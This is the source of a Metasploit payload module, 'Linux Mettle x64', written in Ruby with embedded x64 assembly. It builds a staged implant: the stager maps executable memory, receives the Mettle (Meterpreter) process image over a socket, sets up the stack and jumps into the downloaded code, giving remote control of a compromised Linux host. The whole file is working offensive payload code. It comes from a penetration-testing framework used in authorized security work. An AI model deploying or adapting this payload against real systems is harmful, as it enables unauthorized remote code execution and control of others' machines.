##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/base/sessions/meterpreter_x64_linux'
require 'msf/base/sessions/meterpreter_options'
require 'msf/base/sessions/mettle_config'
require 'rex/elfparsey'

module MetasploitModule
  include Msf::Sessions::MeterpreterOptions
  include Msf::Sessions::MettleConfig

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name'          => 'Linux Mettle x64',
        'Description'   => 'Inject the mettle server payload (staged)',
        'Author'        => [
          'Brent Cook <bcook[at]rapid7.com>'
        ],
        'Platform'      => 'Linux',
        'Arch'          => ARCH_X64,
        'License'       => MSF_LICENSE,
        'Session'       => Msf::Sessions::Meterpreter_x64_Linux
      )
    )
  end

  def elf_ep(payload)
    elf = Rex::ElfParsey::Elf.new(Rex::ImageSource::Memory.new(payload))
    elf.elf_header.e_entry
  end

  def asm_intermediate_stage(payload)
    entry_offset = elf_ep(payload)

    %(
      push rdi                    ; save sockfd
      xor rdi, rdi                ; address
      mov rsi, #{payload.length}  ; length
      mov rdx, 0x7                ; PROT_READ | PROT_WRITE | PROT_EXECUTE
      mov r10, 0x22               ; MAP_PRIVATE | MAP_ANONYMOUS
      xor r8, r8                  ; fd
      xor r9, r9                  ; offset
      mov rax, 0x9                ; mmap
      syscall

      ; receive mettle process image
      mov rdx, rsi                ; length
      mov rsi, rax                ; address
      pop rdi                     ; sockfd
      mov r10, 0x100              ; MSG_WAITALL
      xor r8, r8                  ; srcaddr
      xor r9, r9                  ; addrlen
      mov rax, 45                 ; recvfrom
      syscall

      ; setup stack
      and rsp, -0x10              ; Align
      add sp, 80                  ; Add room for initial stack and prog name
      mov rax, 109                ; prog name "m"
      push rax                    ;
      mov rcx, rsp                ; save the stack
      xor rbx, rbx
      push rbx                    ; NULL
      push rbx                    ; AT_NULL
      push rsi                    ; mmap'd address
      mov rax, 7                  ; AT_BASE
      push rax
      push rbx                    ; end of ENV
      push rbx                    ; NULL
      push rdi                    ; ARGV[1] int sockfd
      push rcx                    ; ARGV[0] char *prog_name
      mov rax, 2                  ; ARGC
      push rax

      ; down the rabbit hole
      mov rax, #{entry_offset}
      add rsi, rax
      jmp rsi
    )
  end

  def generate_intermediate_stage(payload)
    Metasm::Shellcode.assemble(Metasm::X64.new, asm_intermediate_stage(payload)).encode_string
  end

  def handle_intermediate_stage(conn, payload)
    midstager = generate_intermediate_stage(payload)
    vprint_status("Transmitting intermediate stager...(#{midstager.length} bytes)")
    conn.put(midstager) == midstager.length
  end

  def generate_stage(opts = {})
    MetasploitPayloads::Mettle.new('x86_64-linux-musl',
      generate_config(opts.merge({scheme: 'tcp'}))).to_binary :process_image
  end
end
